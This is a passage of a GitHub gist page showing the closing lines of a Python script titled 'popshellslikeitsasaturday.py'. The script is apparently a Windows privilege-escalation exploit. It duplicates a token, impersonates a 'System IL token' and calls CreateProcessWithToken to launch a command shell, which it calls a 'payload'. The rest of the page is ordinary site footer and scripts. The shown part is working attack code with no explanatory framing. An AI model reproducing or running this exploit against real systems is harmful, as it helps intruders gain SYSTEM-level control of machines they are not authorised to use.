        <td id="file-popshellslikeitsasaturday-py-LC432" class="blob-code blob-code-inner js-file-line">                            <span class="pl-c1">TOKEN_TYPE</span>.TokenPrimary,                     <span class="pl-c"><span class="pl-c">#</span> _In_     TokenType          Specifies a value from the TOKEN_TYPE enumeration.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L433" class="blob-num js-line-number" data-line-number="433"></td>
        <td id="file-popshellslikeitsasaturday-py-LC433" class="blob-code blob-code-inner js-file-line">                            byref(hTokendupe))                           <span class="pl-c"><span class="pl-c">#</span> _Out_    phNewToken         A pointer to a HANDLE variable that receives the new token.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L434" class="blob-num js-line-number" data-line-number="434"></td>
        <td id="file-popshellslikeitsasaturday-py-LC434" class="blob-code blob-code-inner js-file-line">                    ImpersonateLoggedOnUser(hTokendupe)                  <span class="pl-c"><span class="pl-c">#</span> _In_     hToken             A handle to a primary or impersonation access token that represents a logged-on user. This can be a token handle returned by a call to NtFilterToken function.  If hToken is a handle to an impersonation token, the token must have TOKEN_QUERY and TOKEN_IMPERSONATE access.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L435" class="blob-num js-line-number" data-line-number="435"></td>
        <td id="file-popshellslikeitsasaturday-py-LC435" class="blob-code blob-code-inner js-file-line">                    <span class="pl-c1">print</span> <span class="pl-s"><span class="pl-pds">&quot;</span><span class="pl-cce">\t</span>[*] Impersonating System IL token<span class="pl-pds">&quot;</span></span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L436" class="blob-num js-line-number" data-line-number="436"></td>
        <td id="file-popshellslikeitsasaturday-py-LC436" class="blob-code blob-code-inner js-file-line">                    <span class="pl-c1">SW_SHOW</span>                   <span class="pl-k">=</span> <span class="pl-c1">5</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L437" class="blob-num js-line-number" data-line-number="437"></td>
        <td id="file-popshellslikeitsasaturday-py-LC437" class="blob-code blob-code-inner js-file-line">                    lpStartupInfo             <span class="pl-k">=</span> STARTUPINFO()            </td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L438" class="blob-num js-line-number" data-line-number="438"></td>
        <td id="file-popshellslikeitsasaturday-py-LC438" class="blob-code blob-code-inner js-file-line">                    lpStartupInfo.cb 	      <span class="pl-k">=</span> sizeof(lpStartupInfo)</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L439" class="blob-num js-line-number" data-line-number="439"></td>
        <td id="file-popshellslikeitsasaturday-py-LC439" class="blob-code blob-code-inner js-file-line">                    lpProcessInformation      <span class="pl-k">=</span> PROCESS_INFORMATION()     </td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L440" class="blob-num js-line-number" data-line-number="440"></td>
        <td id="file-popshellslikeitsasaturday-py-LC440" class="blob-code blob-code-inner js-file-line">                    <span class="pl-c1">STARTF_USESHOWWINDOW</span>      <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>00000001</span> <span class="pl-c"><span class="pl-c">#</span> The wShowWindow member contains additional information.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L441" class="blob-num js-line-number" data-line-number="441"></td>
        <td id="file-popshellslikeitsasaturday-py-LC441" class="blob-code blob-code-inner js-file-line">                    lpStartupInfo.dwFlags     <span class="pl-k">=</span> <span class="pl-c1">STARTF_USESHOWWINDOW</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L442" class="blob-num js-line-number" data-line-number="442"></td>
        <td id="file-popshellslikeitsasaturday-py-LC442" class="blob-code blob-code-inner js-file-line">                    lpStartupInfo.wShowWindow <span class="pl-k">=</span> <span class="pl-c1">SW_SHOW</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L443" class="blob-num js-line-number" data-line-number="443"></td>
        <td id="file-popshellslikeitsasaturday-py-LC443" class="blob-code blob-code-inner js-file-line">                    <span class="pl-c1">CREATE_NEW_CONSOLE</span>        <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>00000010</span>                </td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L444" class="blob-num js-line-number" data-line-number="444"></td>
        <td id="file-popshellslikeitsasaturday-py-LC444" class="blob-code blob-code-inner js-file-line">                    CMDPath                   <span class="pl-k">=</span> create_unicode_buffer(<span class="pl-c1">1024</span>)</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L445" class="blob-num js-line-number" data-line-number="445"></td>
        <td id="file-popshellslikeitsasaturday-py-LC445" class="blob-code blob-code-inner js-file-line">                    kernel32.GetEnvironmentVariableW(<span class="pl-s"><span class="pl-k">u</span><span class="pl-pds">&quot;</span>COMSPEC<span class="pl-pds">&quot;</span></span>, CMDPath, <span class="pl-c1">1024</span>)</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L446" class="blob-num js-line-number" data-line-number="446"></td>
        <td id="file-popshellslikeitsasaturday-py-LC446" class="blob-code blob-code-inner js-file-line">                    lpApplicationName         <span class="pl-k">=</span> CMDPath.value</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L447" class="blob-num js-line-number" data-line-number="447"></td>
        <td id="file-popshellslikeitsasaturday-py-LC447" class="blob-code blob-code-inner js-file-line">                    knacracklov3 <span class="pl-k">=</span> CreateProcessWithToken(                </td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L448" class="blob-num js-line-number" data-line-number="448"></td>
        <td id="file-popshellslikeitsasaturday-py-LC448" class="blob-code blob-code-inner js-file-line">		             hTokendupe,                                  <span class="pl-c"><span class="pl-c">#</span> _In_        hToken             A handle to the primary token that represents a user. The handle must have the TOKEN_QUERY, TOKEN_DUPLICATE, and TOKEN_ASSIGN_PRIMARY access rights. To get a primary token that represents the specified user, call the DuplicateTokenEx function to convert an impersonation token into a primary token.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L449" class="blob-num js-line-number" data-line-number="449"></td>
        <td id="file-popshellslikeitsasaturday-py-LC449" class="blob-code blob-code-inner js-file-line">	            	     <span class="pl-c1">LOGON_NETCREDENTIALS_ONLY</span>,                   <span class="pl-c"><span class="pl-c">#</span> _In_        dwLogonFlags       Log on, but use the specified credentials on the network only. The new process uses the same token as the caller, but the system creates a new logon session within LSA, and the process uses the specified credentials as the default credentials.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L450" class="blob-num js-line-number" data-line-number="450"></td>
        <td id="file-popshellslikeitsasaturday-py-LC450" class="blob-code blob-code-inner js-file-line">	            	     lpApplicationName,                           <span class="pl-c"><span class="pl-c">#</span> _In_opt_    lpApplicationName  The name of the module to be executed.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L451" class="blob-num js-line-number" data-line-number="451"></td>
        <td id="file-popshellslikeitsasaturday-py-LC451" class="blob-code blob-code-inner js-file-line">	            	     <span class="pl-c1">None</span>,                                        <span class="pl-c"><span class="pl-c">#</span> _Inout_opt_ lpCommandLine      The command line to be executed.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L452" class="blob-num js-line-number" data-line-number="452"></td>
        <td id="file-popshellslikeitsasaturday-py-LC452" class="blob-code blob-code-inner js-file-line">	            	     <span class="pl-c1">CREATE_NEW_CONSOLE</span>,                          <span class="pl-c"><span class="pl-c">#</span> _In_        dwCreationFlagg    The flags that control how the process is created.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L453" class="blob-num js-line-number" data-line-number="453"></td>
        <td id="file-popshellslikeitsasaturday-py-LC453" class="blob-code blob-code-inner js-file-line">	            	     <span class="pl-c1">None</span>,                                        <span class="pl-c"><span class="pl-c">#</span> _In_opt_    lpEnvironment      A pointer to an environment block for the new process. If this parameter is NULL, the new process uses an environment created from the profile of the user specified by lpUsername.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L454" class="blob-num js-line-number" data-line-number="454"></td>
        <td id="file-popshellslikeitsasaturday-py-LC454" class="blob-code blob-code-inner js-file-line">	            	     <span class="pl-c1">None</span>,                                        <span class="pl-c"><span class="pl-c">#</span> _In_opt_    dwCreationFlags    The flags that control how the process is created. The new process has a new console, instead of inheriting the parent&#39;s console. This flag cannot be used with the DETACHED_PROCESS flag.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L455" class="blob-num js-line-number" data-line-number="455"></td>
        <td id="file-popshellslikeitsasaturday-py-LC455" class="blob-code blob-code-inner js-file-line">	            	     byref(lpStartupInfo),                        <span class="pl-c"><span class="pl-c">#</span> _In_        lpStartupInfo      A pointer to a STARTUPINFO structure.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L456" class="blob-num js-line-number" data-line-number="456"></td>
        <td id="file-popshellslikeitsasaturday-py-LC456" class="blob-code blob-code-inner js-file-line">	            	     byref(lpProcessInformation))                 <span class="pl-c"><span class="pl-c">#</span> _Out_       lpProcessInfo      A pointer to a PROCESS_INFORMATION structure that receives identification information for the new process, including a handle to the process.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L457" class="blob-num js-line-number" data-line-number="457"></td>
        <td id="file-popshellslikeitsasaturday-py-LC457" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">if</span> knacracklov3 <span class="pl-k">==</span> <span class="pl-c1">0</span>:</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L458" class="blob-num js-line-number" data-line-number="458"></td>
        <td id="file-popshellslikeitsasaturday-py-LC458" class="blob-code blob-code-inner js-file-line">                        <span class="pl-k">raise</span> <span class="pl-c1">RuntimeError</span>(<span class="pl-s"><span class="pl-pds">&quot;</span>Error while triggering admin payload using CreateProcessWithLogonW: <span class="pl-c1">%s</span><span class="pl-pds">&quot;</span></span> <span class="pl-k">%</span>GetLastError())</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L459" class="blob-num js-line-number" data-line-number="459"></td>
        <td id="file-popshellslikeitsasaturday-py-LC459" class="blob-code blob-code-inner js-file-line">                    <span class="pl-c1">print</span> <span class="pl-s"><span class="pl-pds">&quot;</span>[*] Triggering payload PID:<span class="pl-pds">&quot;</span></span>, lpProcessInformation.dwProcessId</td>
      </tr>
</table>


  </div>

  </div>
</div>


    <a name="comments"></a>
    <div class="discussion-timeline gist-discussion-timeline js-quote-selection-container" data-quote-markdown=".js-comment-body">
      <div class="js-discussion js-socket-channel" data-channel="marked-as-read:gist:92645111">
        

<!-- Rendered timeline since 2018-10-24 16:05:51 -->
<div id="partial-timeline-marker"
      class="js-timeline-marker js-updatable-content"
      data-url="/gavz/f7d6633f43954215f11f83689d44abb2/show_partial?partial=gist%2Ftimeline_marker&amp;since=1540422351"
      data-last-modified="Wed, 24 Oct 2018 23:05:51 GMT"
      >
</div>


        <div class="discussion-timeline-actions">
            <div class="flash flash-warn mt-3">
    <a rel="nofollow" class="btn btn-primary" href="/join?source=comment-gist">Sign up for free</a>
    <strong>to join this conversation on GitHub</strong>.
    Already have an account?
    <a rel="nofollow" href="/login?return_to=https%3A%2F%2Fgist.github.com%2Fgavz%2Ff7d6633f43954215f11f83689d44abb2">Sign in to comment</a>
</div>

        </div>
      </div>
    </div>
</div>
  </div>

  <div class="modal-backdrop js-touch-events"></div>
</div><!-- /.container -->

    </div>
  </div>

  </div>

        
<div class="footer container-lg px-3" role="contentinfo">
  <div class="position-relative d-flex flex-justify-between pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light ">
    <ul class="list-style-none d-flex flex-wrap ">
      <li class="mr-3">&copy; 2018 <span title="0.19750s from unicorn-6fd786db5c-2kbrr">GitHub</span>, Inc.</li>
        <li class="mr-3"><a data-ga-click="Footer, go to terms, text:terms" href="https://github.com/site/terms">Terms</a></li>
        <li class="mr-3"><a data-ga-click="Footer, go to privacy, text:privacy" href="https://github.com/site/privacy">Privacy</a></li>
        <li class="mr-3"><a href="https://help.github.com/articles/github-security/" data-ga-click="Footer, go to security, text:security">Security</a></li>
        <li class="mr-3"><a href="https://status.github.com/" data-ga-click="Footer, go to status, text:status">Status</a></li>
        <li><a data-ga-click="Footer, go to help, text:help" href="https://help.github.com">Help</a></li>
    </ul>

    <a aria-label="Homepage" title="GitHub" class="footer-octicon mr-lg-4" href="https://github.com">
      <svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="24" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg>
</a>
   <ul class="list-style-none d-flex flex-wrap ">
        <li class="mr-3"><a data-ga-click="Footer, go to contact, text:contact" href="https://github.com/contact">Contact GitHub</a></li>
        <li class="mr-3"><a href="https://github.com/pricing" data-ga-click="Footer, go to Pricing, text:Pricing">Pricing</a></li>
      <li class="mr-3"><a href="https://developer.github.com" data-ga-click="Footer, go to api, text:api">API</a></li>
      <li class="mr-3"><a href="https://training.github.com" data-ga-click="Footer, go to training, text:training">Training</a></li>
        <li class="mr-3"><a href="https://blog.github.com" data-ga-click="Footer, go to blog, text:blog">Blog</a></li>
        <li><a data-ga-click="Footer, go to about, text:about" href="https://github.com/about">About</a></li>

    </ul>
  </div>
  <div class="d-flex flex-justify-center pb-6">
    <span class="f6 text-gray-light"></span>
  </div>
</div>



  <div id="ajax-error-message" class="ajax-error-message flash flash-error">
    <svg class="octicon octicon-alert" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"/></svg>
    <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
      <svg class="octicon octicon-x" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.48 8l3.75 3.75-1.48 1.48L6 9.48l-3.75 3.75-1.48-1.48L4.52 8 .77 4.25l1.48-1.48L6 6.52l3.75-3.75 1.48 1.48L7.48 8z"/></svg>
    </button>
    You can’t perform that action at this time.
  </div>


    <script crossorigin="anonymous" integrity="sha512-BlCeoZU+kjn7xucWZBcl0n4Bn0P8dE19/sUfLHOxySQnsoy3ufEzapurMbZWSlwab5KGfnp1X5ipJvUDMLroqw==" type="application/javascript" src="https://assets-cdn.github.com/assets/compat-0f98b12d09f3ba331eef956ab02996e3.js"></script>
    <script crossorigin="anonymous" integrity="sha512-9E3sHSwrJGUiIDmf7IURDLz9Ob2E/W2JRykVfAAaL0cvLrwnjoUYAeLu4XQ4j9RTPLclLDLAeRhbGR9bwxTiyg==" type="application/javascript" src="https://assets-cdn.github.com/assets/frameworks-8b43903482b2c45904929cdac0c62a0e.js"></script>
    
    <script crossorigin="anonymous" async="async" integrity="sha512-uimFLj2l8AgH8rVYsRjUJMNIYnhhwxvgb9dzL6l3CbJnZ2mDNfjNLs886EwROabHYzazZ2H+39L0BsklbxnarA==" type="application/javascript" src="https://assets-cdn.github.com/assets/github-fba71fede55f8fcd9445b8486b85d94d.js"></script>
    
      <script crossorigin="anonymous" async="async" integrity="sha512-eR87/Pk7Jaw26DpCL/zF+dWc1KE26Y5nwOqXOphUGXqCimL+fgkbzm9ijFsy91uLIoxrXgfExnaVaChxmEbFSw==" type="application/javascript" src="https://assets-cdn.github.com/assets/gist-f0a060fe3a6c5e3b1ecd21baab6c9bf3.js"></script>

    
  <div class="js-stale-session-flash stale-session-flash flash flash-warn flash-banner d-none">
    <svg class="octicon octicon-alert" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"/></svg>
    <span class="signed-in-tab-flash">You signed in with another tab or window. <a href="">Reload</a> to refresh your session.</span>
    <span class="signed-out-tab-flash">You signed out in another tab or window. <a href="">Reload</a> to refresh your session.</span>
  </div>
  <div class="facebox" id="facebox" style="display:none;">
  <div class="facebox-popup">
    <div class="facebox-content" role="dialog" aria-labelledby="facebox-header" aria-describedby="facebox-description">
    </div>
    <button type="button" class="facebox-close js-facebox-close" aria-label="Close modal">
      <svg class="octicon octicon-x" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.48 8l3.75 3.75-1.48 1.48L6 9.48l-3.75 3.75-1.48-1.48L4.52 8 .77 4.25l1.48-1.48L6 6.52l3.75-3.75 1.48 1.48L7.48 8z"/></svg>
    </button>
  </div>
</div>

  <template id="site-details-dialog">
  <details class="details-reset details-overlay details-overlay-dark lh-default text-gray-dark" open>
    <summary aria-haspopup="dialog" aria-label="Close dialog"></summary>
    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast">
      <button class="Box-btn-octicon m-0 btn-octicon position-absolute right-0 top-0" type="button" aria-label="Close dialog" data-close-dialog>
        <svg class="octicon octicon-x" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.48 8l3.75 3.75-1.48 1.48L6 9.48l-3.75 3.75-1.48-1.48L4.52 8 .77 4.25l1.48-1.48L6 6.52l3.75-3.75 1.48 1.48L7.48 8z"/></svg>
      </button>
      <div class="octocat-spinner my-6 js-details-dialog-spinner"></div>
    </details-dialog>
  </details>
</template>

  <div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;" tabindex="0">
  <div class="Popover-message Popover-message--bottom-left Popover-message--large Box box-shadow-large" style="width:360px;">
  </div>
</div>

<div id="hovercard-aria-description" class="sr-only">
  Press h to open a hovercard with more details.
</div>


  </body>
</html>

